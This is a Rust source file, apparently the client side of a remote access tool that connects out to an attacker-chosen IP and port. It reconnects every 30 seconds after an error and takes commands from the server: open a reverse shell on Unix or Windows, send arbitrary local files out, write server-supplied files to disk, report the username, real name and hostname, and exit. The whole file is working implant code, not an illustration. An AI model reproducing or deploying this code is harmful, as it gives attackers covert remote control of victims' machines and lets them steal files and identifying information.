use std::{process, thread};
use std::fs::OpenOptions;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::Path;
use std::time::Duration;

use colored::Colorize;
use whoami::fallible;

use crate::{error, shell, success};
use crate::files::{prep_download, receive_file, upload};

pub fn start_client(ip: String, port: String) {
    loop {
        match TcpStream::connect(format!("{}:{}", ip, port)) {
            Ok(mut stream) => {
                success!("Successfully connected to server in port {}", port);
                //Wait for server
                let mut buffer = [0; 1024];
                loop {
                    match stream.read(&mut buffer) {
                        Ok(size) => {
                            if size > 0 {
                                match handle_server_response(
                                    &mut stream,
                                    String::from_utf8_lossy(&buffer[..size]).to_string(),
                                ) {
                                    Ok(_) => {}
                                    Err(e) => {
                                        error!("{}", e);
                                        break;
                                    }
                                }
                            }
                        }
                        Err(e) => {
                            error!("Failed to read from server: {}", e);
                            break;
                        }
                    }
                    thread::sleep(Duration::from_millis(100)); // Prevent busy-waiting
                }
            }
            Err(e) => {
                error!("Error: {}", e);
            }
        }
        //Auto-reconnect to the server if an error occurs
        thread::sleep(Duration::from_secs(30));
    }
}

fn handle_server_response(stream: &mut TcpStream, response: String) -> Result<(), String> {
    let mut lines = response.lines();
    if let Some(first_line) = lines.next() {
        match first_line {
            "CLOSE" => {
                stream.write_all(b"OK").unwrap();
                process::exit(0);
            }
            "SHELL" => {
                stream.write_all(b"OK").unwrap();
                let port = lines
                    .next()
                    .unwrap()
                    .trim_matches(char::from(0))
                    .trim()
                    .to_string();
                thread::sleep(Duration::from_secs(1));
                #[cfg(unix)]
                if let Err(err) =
                    shell::unixshell::shell(stream.peer_addr().unwrap().ip().to_string(), port)
                {
                    error!("{}", err);
                }

                #[cfg(windows)]
                if let Err(err) =
                    shell::winshell::shell(stream.peer_addr().unwrap().ip().to_string(), port)
                {
                    error!("{}", err);
                }
            }
            "UPLOAD" => {
                let path_str = lines.next().unwrap().trim_matches(char::from(0)).trim();
                let file_len = lines
                    .next()
                    .unwrap()
                    .trim_matches(char::from(0))
                    .trim()
                    .parse::<u64>()
                    .unwrap();
                let output = Path::new(&path_str);
                match prep_download(output) {
                    Ok(_) => {
                        stream.write_all(b"OK").unwrap();
                        receive_file(stream, output, file_len);
                    }
                    Err(e) => stream.write_all(e.as_bytes()).unwrap(),
                }
            }
            "DOWNLOAD" => {
                let path_str = lines.next().unwrap().trim_matches(char::from(0)).trim();
                match OpenOptions::new().read(true).open(path_str) {
                    Ok(file) => match file.metadata() {
                        Ok(metadata) => {
                            stream
                                .write_all(format!("OK\n\r{}", metadata.len()).as_bytes())
                                .unwrap();
                            upload(stream, Path::new(path_str));
                        }
                        Err(e) => stream.write_all(e.to_string().as_bytes()).unwrap(),
                    },
                    Err(e) => stream.write_all(e.to_string().as_bytes()).unwrap(),
                };
            }
            "INFO" => {
                let info = format!(
                    "Platform: {}\nOS: {}\nCPU Arch: {}\nUsername: {}\nName: {}\nDevice name: {}\nHostname: {}",
                    whoami::platform(), whoami::distro(), whoami::arch(), whoami::username(),  whoami::realname(), whoami::devicename(), fallible::hostname().unwrap_or(String::from("ERROR"))
                );
                stream.write_all(info.as_bytes()).unwrap();
            }
            "QUIT" => {
                thread::sleep(Duration::from_millis(500));
                return Err("Host disconnected!".to_string());
            }
            _ => stream
                .write_all(
                    format!(
                        "DEBUG -> {}",
                        lines.collect::<Vec<&str>>().join(" ").to_string()
                    )
                    .as_bytes(),
                )
                .unwrap(),
        }
    }
    Ok(())
}
